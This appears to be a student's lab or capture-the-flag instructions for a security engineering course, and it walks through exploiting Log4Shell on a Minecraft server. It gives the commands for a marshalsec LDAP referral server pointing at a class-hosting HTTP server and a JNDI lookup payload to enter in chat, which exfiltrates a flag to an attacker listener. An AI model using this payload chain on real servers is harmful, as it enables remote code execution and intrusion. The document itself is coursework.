Make sure PATH includes mvn and JAVA_HOME points to the Java8 jdk in the directory.

Open 3 shells in ~/Desktop/CS4401_Security_Engineering/host-share/Mine4shell/marshalsec


On the first, run java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://130.215.217.133:8000/#Log4jRCE"

On the second, run python3 -m http.server

On the third (or in an IDE) run attackSide.java


Open the mc server and enter ${jndi:ldap://ATTACKERCOMPUTERIP:1389/Log4jRCE}

(This only worked on campus for me, I think it has to do with public facing IPs)

The flag should be sent to attackSide.java and printed out to stdout.
